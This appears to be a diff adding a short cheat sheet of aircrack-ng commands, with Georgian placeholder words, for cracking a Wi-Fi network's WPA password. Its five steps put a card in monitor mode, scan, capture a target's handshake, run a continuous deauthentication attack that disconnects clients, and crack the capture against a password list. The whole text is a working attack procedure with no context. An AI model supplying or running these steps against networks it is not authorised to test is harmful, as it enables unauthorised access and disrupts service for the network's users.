@@ -1,0 +1,5 @@
+1. airmon-ng start wlan0
+2. airodump-ng wlan0
+3. airodump-ng -c(chanelis nomeri) -w ramesaxeli -d BSSID wlan0
+4. aireplay-ng --deauth 0 -a BSSID -c stationis aidi wlan0
+5. aircrack-ng capture failis saxeli.cap -w password list faili.txt
